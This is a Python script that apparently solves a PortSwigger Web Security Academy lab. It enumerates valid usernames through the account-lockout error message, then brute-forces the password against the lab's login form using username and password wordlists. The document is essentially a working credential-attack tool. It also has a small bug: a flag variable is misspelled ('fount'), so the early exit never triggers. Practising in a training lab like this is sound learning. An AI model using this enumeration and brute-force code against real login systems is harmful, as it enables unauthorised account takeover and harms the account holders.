import requests
from bs4 import BeautifulSoup
import time

lab_url = 'https://0a2e001704a7b31d80c6b22600c9000b.web-security-academy.net/login'
GREEN = "\033[92m"
RESET = "\033[0m"
def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()

def extractErrorMessage(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.select_one('.is-warning')

usernames = readFile("usernames.txt")
passwords = readFile("passwords.txt")


right_username = 'agent'
found_user = False

for username in usernames:
    if found_user == True:
        break
    data = {'username': username, 'password': 'password'}
    for i in range(1,5):
        response = requests.post(url=lab_url, data=data)
        err = extractErrorMessage(response.text)
        if err:
            if err.get_text(strip=True) == 'You have made too many incorrect login attempts. Please try again in 1 minute(s).':
                print(f"{GREEN}username: {username}")
                right_username = username
                fount = True
            else:
                print(f"{RESET}{err.get_text(strip=True)}")


for password in passwords:
    data = {'username': right_username, 'password': password}
    response = requests.post(url=lab_url, data=data)
    err = extractErrorMessage(response.text)
    if err and err.get_text(strip=True) == 'You have made too many incorrect login attempts. Please try again in 1 minute(s).':
        print('Error shown - looking for password which doesnt show this error')
    if not err: 
        print(f"{GREEN}Logged in successfully using the password {password} for user {right_username}")
        break

            

